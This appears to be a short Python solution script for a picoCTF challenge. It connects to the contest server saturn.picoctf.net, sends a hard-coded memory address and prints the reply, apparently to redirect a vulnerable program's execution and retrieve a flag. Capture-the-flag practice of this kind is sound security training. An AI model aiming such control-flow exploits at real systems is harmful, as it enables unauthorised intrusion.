import socket

target = 'saturn.picoctf.net'
port = 55696

address = '000000000040129e\n'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as pico:
    pico.connect((target, port))
    pico.recv(1024)
    pico.send(address.encode())
    pico.recv(1024)   
    print(pico.recv(1024).decode())
